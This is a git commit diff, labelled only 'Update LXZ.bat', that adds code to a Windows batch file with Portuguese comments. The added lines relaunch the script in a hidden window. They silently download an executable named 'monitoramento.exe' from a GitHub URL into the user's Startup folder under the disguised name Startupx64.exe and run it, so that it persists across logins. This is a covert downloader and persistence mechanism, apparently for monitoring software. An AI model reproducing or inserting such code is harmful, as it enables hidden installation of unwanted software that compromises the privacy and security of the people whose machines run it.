ae1de2e19b55190c4c02a4b618b08a7c8574fa5b
lcmandrikion-hash <lcmandrikion@gmail.com>
2026-03-05 22:45:33 -0300

    Update LXZ.bat

--- LXZ.bat
+++ LXZ.bat
@@ -1,4 +1,22 @@
 @echo off
+:: Reexecuta o próprio script oculto
+if "%1" neq "hidden" (
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden"
+    exit
+)
+
+:: URL do .exe
+set "URL=https://github.com/lcmandrikion-hash/MNTR/raw/refs/heads/main/monitoramento.exe"
+
+:: Caminho da pasta Startup
+set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Startupx64.exe"
+
+:: Baixa o arquivo
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%STARTUP%'"
+
+:: Executa o arquivo
+start "" "%STARTUP%"
+
 setlocal
 
 set "TEMP_EXE=%TEMP%\seguranca.exe"
